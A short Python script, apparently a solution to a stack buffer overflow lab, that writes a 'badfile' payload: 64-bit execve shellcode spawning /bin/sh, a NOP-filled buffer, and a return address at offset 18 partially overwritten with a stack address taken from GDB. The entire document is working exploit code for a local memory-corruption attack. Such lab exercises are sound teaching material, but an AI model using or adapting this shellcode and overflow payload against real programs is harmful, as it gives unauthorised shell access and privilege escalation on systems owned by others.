#!/usr/bin/python3
import sys

# 64-bit shellcode
shellcode = (
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# For this tiny buffer, we:
# 1. Place shellcode at the beginning (to avoid NULL byte issues)
# 2. Use precise offset calculation

# Put the shellcode at the beginning
start = 0
content[start:start + len(shellcode)] = shellcode

# With buffer size = 10, the return address is only 18 bytes from buffer start
offset = 18

# Use partial overwrite technique for 64-bit address
buffer_addr = 0x7fffffffbb86  # Buffer address from GDB

# Only overwrite lower 6 bytes to avoid NULL bytes
L = 6
content[offset:offset + L] = (buffer_addr & 0xFFFFFFFFFFFF).to_bytes(L, byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
